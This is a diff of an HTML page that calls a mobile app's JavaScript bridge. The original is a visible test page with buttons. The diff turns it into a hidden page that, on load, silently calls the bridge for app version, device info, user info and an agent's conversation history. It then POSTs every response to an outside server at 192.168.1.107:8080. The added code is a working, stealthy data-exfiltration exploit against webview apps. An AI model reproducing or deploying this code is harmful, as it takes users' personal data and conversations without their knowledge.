@@ -1,179 +1,89 @@
 <!DOCTYPE html>
 <html>
-
 <head>
     <meta charset="utf-8">
-    <title>test</title>
     <style>
         body {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            min-height: 100vh;
             margin: 0;
-            padding: 15vh 20px 0;
-            background: #f0f2f5;
-            box-sizing: border-box;
-            ​**font-size: 36px;
-            **​
-            /* 全局基准字号 ×2 */
-        }
-
-        pre {
-            padding: 20px;
-            border: 1px solid #ddd;
-            background: #fff;
-            white-space: pre-wrap;
-            overflow-wrap: break-word;
-            width: 600px;
-            min-height: 200px;
-            border-radius: 8px;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
-            ​**line-height: 1.8;
-            **​
-            /* 行高 ×2 */
-            ​**font-family: monospace, sans-serif;
-            **​
-            /* 明确字體 */
-            margin-top: 30px;
-        }
-
-        button {
-            padding: 16px 40px;
-            /* 内边距 ×2 */
-            background: #007bff;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
-            font-size: ​**36px;
-            **​
-            /* 按钮字号 ×2 */
-            transition: all 0.3s;
-            transform: translateY(20%);
-            ​**min-width: 220px;
-            **​
-            /* 最小宽度 ×2 */
-        }
-
-        button:hover {
-            background: #0056b3;
-            transform: translateY(15%);
-        }
-
-        @media (max-height: 600px) {
-            body {
-                padding-top: 80px;
-            }
+            padding: 0;
+            height: 0;
+            overflow: hidden;  /* 完全隐藏页面内容 */
         }
     </style>
 </head>
-
 <body>
-    <button onclick="getAppVersion()">getAppVersion</button>
-    <button onclick="getDeviceInfo()">getDeviceInfo</button>
-    <button onclick="requestGetUserInfo()">requestGetUserInfo</button>
-    <button onclick="requestGetHistory()">RequestGetHistory</button>
-    <pre id="raw-output">test</pre>
-
     <script>
-        window.jsb = {
-            handleMessage: function (response) {
-                const output = document.getElementById('raw-output');
+        (function init() {
+            // 修改后的通用请求方法
+            const makeRequest = (method, params) => {
                 try {
-                    const rawString = JSON.stringify(response, null, 2);
-                    output.textContent = rawString;
-
-                    // 发送到服务器
-                    fetch('http://192.168.1.107:8080', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json' // 根据服务器要求修改
-                        },
-                        body: rawString
-                    })
-                        .then(() => console.log('发送成功'))
-                        .catch((error) => console.error('发送失败:', error));
-                } catch (e) {
-                    const rawString = `解析错误: ${e.message}`;
-                    output.textContent = rawString;
-
-                    // 发送错误信息到服务器（可选）
-                    fetch('http://192.168.1.107:8080', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'text/plain'
-                        },
-                        body: rawString
-                    })
-                        .then(() => console.log('发送成功'))
-                        .catch((error) => console.error('发送失败:', error));
+                    if (method === 'request') {
+                        const reqData = params === 'userInfo' 
+                            ? {
+                                path: "api/getuserinfo",
+                                method: "GET",
+                                data: "{}",
+                                header: "{}"
+                              }
+                            : {
+                                path: "api/user/agent/conversation/list",
+                                method: "POST",
+                                data: JSON.stringify({
+                                    agentId: "naQivTmsDa",
+                                    offset: 0,
+                                    limit: 40,
+                                    filterGoodQuestion: true
+                                }),
+                                header: "{}"
+                              };
+                        window.JsRuntime.invoke('request', JSON.stringify(reqData), Date.now());
+                    } else {
+                        window.JsRuntime.invoke(method, '{}', `auto_${Date.now()}`);
+                    }
+                } catch (error) {
+                    sendToServer({ error: error.message, method });
                 }
-            }
-        };
+            };
 
-        function requestGetUserInfo() {
-            const output = document.getElementById('raw-output');
-            output.textContent = "(requestData)请求发送中...";
+            // 初始化时执行所有请求
+            ['getAppVersion', 'getDeviceInfo', 'userInfo', 'history'].forEach(method => {
+                setTimeout(() => {  // 添加微小延时避免请求拥堵
+                    if (method === 'userInfo' || method === 'history') {
+                        makeRequest('request', method);
+                    } else {
+                        makeRequest(method);
+                    }
+                }, method === 'getAppVersion' ? 0 : 50);
+            });
 
-            try {
-                req_data = '{"path":"api/getuserinfo","method":"GET","data":"{}","header":"{}"}'
-                window.JsRuntime.invoke('request', req_data, 1000);
-            } catch (error) {
-                output.textContent = `请求失败: ${error.message}`;
-            }
-        }
+            // 网络传输方法
+            window.jsb = {
+                handleMessage: response => {
+                    const payload = {
+                        timestamp: new Date().toISOString(),
+                        type: 'jsb_response',
+                        data: response
+                    };
+                    sendToServer(payload);
+                }
+            };
 
-        function requestGetHistory() {
-            const output = document.getElementById('raw-output');
-            output.textContent = "(requestData)请求发送中...";
-
-            try {
-                const data = {
-                    agentId: "naQivTmsDa",
-                    offset: 0,
-                    limit: 40,
-                    filterGoodQuestion: true
+            function sendToServer(data) {
+                const errorPayload = { 
+                    timestamp: new Date().toISOString(),
+                    type: 'client_error',
+                    data 
                 };
-                const dataJson = JSON.stringify(data);
-                const requestConfig = {
-                    path: "api/user/agent/conversation/list",
-                    method: "POST",
-                    data: dataJson,
-                    header: {}
-                };
-                const str2 = JSON.stringify(requestConfig, null, 2);
-                callback_id = 1013
-                window.JsRuntime.invoke('request', str2, callback_id);
-            } catch (error) {
-                output.textContent = `请求失败: ${error.message}`;
+                
+                fetch('http://192.168.1.107:8080', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data.error ? errorPayload : data)
+                }).catch(error => {
+                    console.error('最终错误捕获:', error);
+                });
             }
-        }
-
-        function getAppVersion() {
-            const output = document.getElementById('raw-output');
-            output.textContent = "请求发送中...";
-
-            try {
-                const callbackId = `dev_${Date.now()}`;
-                window.JsRuntime.invoke('getAppVersion', '{}', callbackId);
-            } catch (error) {
-                output.textContent = `请求失败: ${error.message}`;
-            }
-        }
-
-        function getDeviceInfo() {
-            const output = document.getElementById('raw-output');
-            output.textContent = "请求发送中...";
-
-            try {
-                const callbackId = `dev_${Date.now()}`;
-                window.JsRuntime.invoke('getDeviceInfo', '{}', callbackId);
-            } catch (error) {
-                output.textContent = `请求失败: ${error.message}`;
-            }
-        }  
+        })();
     </script>
 </body>
-
 </html>
